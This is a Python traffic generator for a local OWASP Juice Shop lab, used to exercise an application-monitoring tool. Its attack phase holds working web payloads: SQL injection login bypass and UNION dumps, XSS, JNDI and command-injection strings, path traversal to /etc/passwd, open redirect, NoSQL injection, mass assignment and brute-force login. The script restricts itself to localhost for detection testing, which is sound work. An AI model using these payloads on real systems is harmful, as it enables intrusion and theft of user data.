#!/usr/bin/env python3
"""Request test for OWASP Juice Shop: ~45 requests across 30+ distinct routes, including known vulnerabilities.

Purpose: give ObsidianWatch application monitoring varied, realistic traffic (routes, parameters, auth flow,
errors, injection signatures). Python 3 standard library only.

Usage:
    python3 ow-juice-requests.py                      # all phases once against http://127.0.0.1:3000
    python3 ow-juice-requests.py --rounds 5           # repeat (more volume for baselines / charts)
    python3 ow-juice-requests.py public auth attacks bodies  # choose phases: public, auth, attacks, bodies
    python3 ow-juice-requests.py --base http://127.0.0.1:3000 --delay 0.05

SAFETY: refuses any target that is not on this machine. Juice Shop is deliberately vulnerable; the attack phase
sends real exploit-style requests (SQL injection, XSS, path traversal, open redirect, NoSQL injection, mass
assignment) ONLY to your local lab instance. Endpoints differ a little between Juice Shop versions: a 404 for
a route is reported, not fatal.
"""
import argparse
import json
import random
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PHASES = ["public", "auth", "attacks", "bodies"]


class Client:
    def __init__(self, base, delay):
        self.base, self.delay, self.token, self.rows = base.rstrip("/"), delay, None, []

    def call(self, method, path, body=None, params=None, headers=None, note="", raw_path=False):
        url = self.base + path
        if params:
            url += "?" + urllib.parse.urlencode(params, safe="")
        h = {"Accept": "application/json", "User-Agent": "ow-juice-requests/1.0"}
        if self.token:
            h["Authorization"] = "Bearer " + self.token
        data = None
        if body is not None:
            data = json.dumps(body).encode()
            h["Content-Type"] = "application/json"
        if headers:
            h.update(headers)
        req = urllib.request.Request(url, data=data, method=method, headers=h)
        t0 = time.time()
        status, payload = 0, b""
        try:
            with urllib.request.urlopen(req, timeout=20) as r:
                status, payload = r.status, r.read(200000)
        except urllib.error.HTTPError as e:
            status, payload = e.code, e.read(20000)
        except Exception as e:  # connection refused, timeout
            status, payload = -1, str(e).encode()
        ms = int((time.time() - t0) * 1000)
        self.rows.append((method, path.split("?")[0], status, ms, note))
        print("%-6s %-48s %4s %5dms  %s" % (method, path[:48], status if status > 0 else "ERR", ms, note))
        time.sleep(self.delay)
        try:
            return status, json.loads(payload.decode("utf-8", "replace"))
        except Exception:
            return status, None


def rnd(n=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def phase_public(c):
    print("\n== PUBLIC: browsing and read-only API")
    c.call("GET", "/rest/admin/application-version")
    c.call("GET", "/rest/admin/application-configuration", note="config exposed without auth")
    c.call("GET", "/api/Products")
    for i in (1, 2, 3, 7):
        c.call("GET", "/api/Products/%d" % i)
    c.call("GET", "/rest/products/search", params={"q": "juice"})
    c.call("GET", "/rest/products/search", params={"q": "apple", "page": "1", "sort": "asc"})
    c.call("GET", "/rest/products/1/reviews")
    c.call("GET", "/api/Challenges", params={"name": "score"})
    c.call("GET", "/api/Quantitys")
    c.call("GET", "/api/Deliverys")
    c.call("GET", "/api/SecurityQuestions")
    c.call("GET", "/rest/languages")
    c.call("GET", "/rest/country-mapping")
    c.call("GET", "/rest/chatbot/status")
    c.call("GET", "/rest/captcha")
    c.call("GET", "/rest/user/whoami", note="anonymous")
    c.call("GET", "/rest/track-order/5267-f73dcd000abcc353")
    c.call("GET", "/rest/repeat-notification", params={"challenge": "Score Board"})
    c.call("GET", "/metrics", note="prometheus metrics exposed")
    c.call("GET", "/robots.txt")
    c.call("GET", "/.well-known/security.txt")
    c.call("GET", "/does/not/exist", note="404 on purpose")


def phase_auth(c):
    print("\n== AUTH: register, login, basket, order, feedback")
    email, pw = "ow-%s@example.test" % rnd(), "Passw0rd!%s" % rnd(3)
    c.call("POST", "/api/Users", body={"email": email, "password": pw, "passwordRepeat": pw,
                                       "securityQuestion": {"id": 1}, "securityAnswer": "x"}, note="register")
    st, js = c.call("POST", "/rest/user/login", body={"email": email, "password": pw}, note="login")
    auth = (js or {}).get("authentication") or {}
    c.token, bid = auth.get("token"), auth.get("bid")
    if not c.token:
        print("   (login failed: authenticated requests below will return 401)")
    c.call("GET", "/rest/user/whoami", note="authenticated")
    c.call("GET", "/rest/user/security-question", params={"email": email})
    if bid:
        c.call("GET", "/rest/basket/%s" % bid)
        c.call("POST", "/api/BasketItems", body={"ProductId": 1, "BasketId": str(bid), "quantity": 2}, note="add to basket")
        c.call("POST", "/rest/basket/%s/checkout" % bid, body={}, note="checkout")
    c.call("GET", "/rest/order-history")
    c.call("GET", "/rest/wallet/balance")
    c.call("GET", "/api/Cards")
    c.call("GET", "/api/Addresss")
    c.call("GET", "/rest/deluxe-membership")
    st, cap = c.call("GET", "/rest/captcha")
    if cap:
        c.call("POST", "/api/Feedbacks", body={"comment": "ow test feedback", "rating": 4,
                                               "captchaId": cap.get("captchaId"), "captcha": str(cap.get("answer"))},
               note="feedback (captcha answer is returned by the API)")
    c.call("GET", "/api/Feedbacks")
    c.call("PUT", "/rest/products/1/reviews", body={"message": "nice juice", "author": email}, note="post review")
    c.call("GET", "/rest/user/change-password", params={"current": pw, "new": pw + "x", "repeat": pw + "x"},
           note="password change over GET with secrets in the query")
    c.token = None


def phase_bodies(c):
    print("\n== BODIES: JSON/form bodies so POST/PUT routes show their field names (needs ow-juice.sh body capture)")
    for i in range(8):
        e = "ow-body%d-%s@example.test" % (i, rnd(3))
        c.call("POST", "/api/Users", body={"email": e, "password": "Passw0rd!%d" % i, "passwordRepeat": "Passw0rd!%d" % i,
                                           "securityQuestion": {"id": 1, "answer": "x"}, "securityAnswer": "x"}, note="body fields")
        c.call("POST", "/rest/user/login", body={"email": e, "password": "wrong%d" % i, "remember": True}, note="body fields")
        c.call("POST", "/api/Feedbacks", body={"comment": "ow %d" % i, "rating": 3, "captchaId": i, "captcha": "0"}, note="body fields")
        c.call("PUT", "/rest/products/1/reviews", body={"message": "r%d" % i, "author": e}, note="body fields")


def phase_attacks(c):
    print("\n== ATTACKS (local lab only): injection, traversal, redirect, IDOR, mass assignment")
    # SQL injection in a query parameter (agent signature: param.sql-injection)
    c.call("GET", "/rest/products/search", params={"q": "' OR 1=1--"}, note="SQLi")
    c.call("GET", "/rest/products/search",
           params={"q": "')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--"}, note="UNION SQLi (Users table)")
    c.call("GET", "/rest/products/search", params={"q": "%27%20OR%201%3D1--"}, note="SQLi, pre-encoded (double decode)")
    # XSS / template / command / JNDI in a query parameter
    c.call("GET", "/rest/products/search", params={"q": "<iframe src=\"javascript:alert(`xss`)\">"}, note="XSS")
    c.call("GET", "/rest/products/search", params={"q": "{{7*7}}${jndi:ldap://x.example/a}"}, note="template/JNDI")
    c.call("GET", "/rest/products/search", params={"q": "x; cat /etc/passwd"}, note="command injection syntax")
    c.call("GET", "/rest/track-order/" + urllib.parse.quote("' || true"), note="NoSQL-style injection")
    # SQL injection login -> admin token
    st, js = c.call("POST", "/rest/user/login", body={"email": "' OR 1=1--", "password": "x"}, note="SQLi login bypass")
    admin = ((js or {}).get("authentication") or {}).get("token")
    if admin:
        c.token = admin
        c.call("GET", "/api/Users", note="admin: list all users")
        c.call("GET", "/rest/basket/1", note="IDOR: someone else's basket")
        c.call("GET", "/rest/basket/2", note="IDOR")
        c.call("PATCH", "/rest/products/reviews", body={"id": {"$ne": -1}, "message": "NoSQLi"}, note="NoSQL injection on reviews")
        c.token = None
    # path traversal and file exposure
    c.call("GET", "/ftp")
    c.call("GET", "/ftp/acquisitions.md")
    c.call("GET", "/ftp/package.json.bak", note="blocked extension")
    c.call("GET", "/ftp/package.json.bak%2500.md", note="poison null byte")
    c.call("GET", "/ftp/..%2f..%2f..%2fetc%2fpasswd", note="path traversal")
    c.call("GET", "/support/logs")
    c.call("GET", "/encryptionkeys")
    # open redirect
    c.call("GET", "/redirect", params={"to": "https://github.com/juice-shop/juice-shop"}, note="allowed redirect")
    c.call("GET", "/redirect", params={"to": "https://evil.example/?https://github.com/juice-shop/juice-shop"}, note="open redirect bypass")
    # mass assignment: register as admin
    e = "ow-admin-%s@example.test" % rnd()
    c.call("POST", "/api/Users", body={"email": e, "password": "Passw0rd!", "passwordRepeat": "Passw0rd!", "role": "admin"},
           note="mass assignment: role=admin")
    # brute force login (APP-A01 needs >= 20 failures in 5 min from one client)
    for i in range(25):
        c.call("POST", "/rest/user/login", body={"email": "admin@juice-sh.op", "password": "guess%d" % i}, note="brute force" if i == 0 else "")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base", default="http://127.0.0.1:3000")
    ap.add_argument("--rounds", type=int, default=1)
    ap.add_argument("--delay", type=float, default=0.03)
    ap.add_argument("phases", nargs="*", default=PHASES)
    a = ap.parse_args()
    host = urllib.parse.urlparse(a.base).hostname or ""
    if host not in ("127.0.0.1", "localhost", "::1"):
        sys.exit("refusing to send exploit-style requests to %r: this script only targets a lab instance on this machine" % a.base)
    for p in a.phases:
        if p not in PHASES:
            sys.exit("unknown phase %r (choose from %s)" % (p, ", ".join(PHASES)))
    c = Client(a.base, a.delay)
    if c.call("GET", "/rest/admin/application-version")[0] <= 0:
        sys.exit("Juice Shop is not answering on %s (start it with ./ow-juice.sh start)" % a.base)
    c.rows.clear()
    for r in range(a.rounds):
        if a.rounds > 1:
            print("\n######## round %d/%d" % (r + 1, a.rounds))
        for p in a.phases:
            {"public": phase_public, "auth": phase_auth, "attacks": phase_attacks, "bodies": phase_bodies}[p](c)
    codes, routes = {}, set()
    for m, path, st, ms, _ in c.rows:
        codes[st] = codes.get(st, 0) + 1
        routes.add((m, path))
    print("\n== summary: %d requests, %d distinct method+path combinations" % (len(c.rows), len(routes)))
    print("   status codes:", ", ".join("%s x%d" % (k, v) for k, v in sorted(codes.items())))
    print("   Wait 1-2 minutes, then check Applications > Services > juice-shop (Routes, Security, Alerts, Events).")


if __name__ == "__main__":
    main()
